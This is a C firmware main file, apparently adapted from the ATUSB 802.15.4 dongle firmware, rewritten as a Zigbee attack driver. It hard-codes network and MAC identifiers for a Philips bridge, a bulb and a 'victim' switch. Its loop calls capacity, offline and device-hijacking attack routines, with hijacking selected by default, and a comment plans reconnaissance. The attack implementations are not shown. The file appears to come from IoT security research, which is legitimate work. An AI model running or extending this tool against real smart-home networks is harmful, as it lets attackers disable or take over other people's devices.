/*
 * fw/atusb.c - ATUSB initialization and main loop
 *
 * Written 2008-2011 by Werner Almesberger
 * Copyright 2008-2011 Werner Almesberger
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#include "attack.h"

int main(void)
{
	board_init();
	board_app_init();
	reset_rf();

	user_get_descriptor = sernum_get_descr;

	/* now we should be at 8 MHz */

	usb_init();
	ep0_init();
#ifdef ATUSB
	timer_init();

	/* move interrupt vectors to 0 */
	MCUCR = 1 << IVCE;
	MCUCR = 0;
#endif

	sei();
	_delay_ms(3000);

	// TODO: Here we need to implement Reconnaissance Attack first to determine device types and device address in the netwrok.
	// reconnaissance_attack();

	/** TEST FIELD **/
	uint8_t attack_no = 3;
	// Here we let dst_device = hub, src_device = sensor to test our API
	ieee802154_addr hub_addr = {};
	hub_addr.pan = 0x7051;
	// hub_addr.epan = ST_EPAN_ID; // Used for ST
	hub_addr.epan = PHILIPS_EPAN_ID; // Used for Philips
	hub_addr.short_addr = 0x0001;
	hub_addr.long_addr = PHILIPS_BRIDGE_MAC_ADDR;
	hub_addr.device_type = 0;
	hub_addr.polling_type = 0;

	ieee802154_addr bulb_addr = hub_addr;
	bulb_addr.short_addr = 0x0005;
	bulb_addr.long_addr = PHILIPS_BULB_MAC_ADDR;
	bulb_addr.device_type = 1;
	bulb_addr.polling_type = 0;

	ieee802154_addr victim_addr = hub_addr;
	victim_addr.short_addr = 0xbf0f;
	victim_addr.long_addr = PHILIPS_SWITCH_MAC_ADDR;
	victim_addr.polling_type = 2;
	victim_addr.device_type = 2;
	victim_addr.rx_when_idle = 0;
	/** END OF TEST FIELD **/

	while (1)
	{
		if( attack_no == 0xff)
		{
			sleep_mode();
		}
		else if (attack_no == 1)
		{
			// Fill up ZED list
			capacity_attack(&bulb_addr, 0x10000000, 2);
			attack_no = 0xff;
		}
		else if (attack_no == 2)
		{
			offline_attack(&hub_addr, &victim_addr, 0x20000000);
			attack_no = 0xff;
		}
		else if (attack_no == 3)
		{
			bulb_addr.beacon_update_id = 0x08;
			hijacking_attack(&bulb_addr, &victim_addr, 0x30000000);
			attack_no = 0xff;
		}
		else
		{
			sleep_mode();
		}
		
	}
}
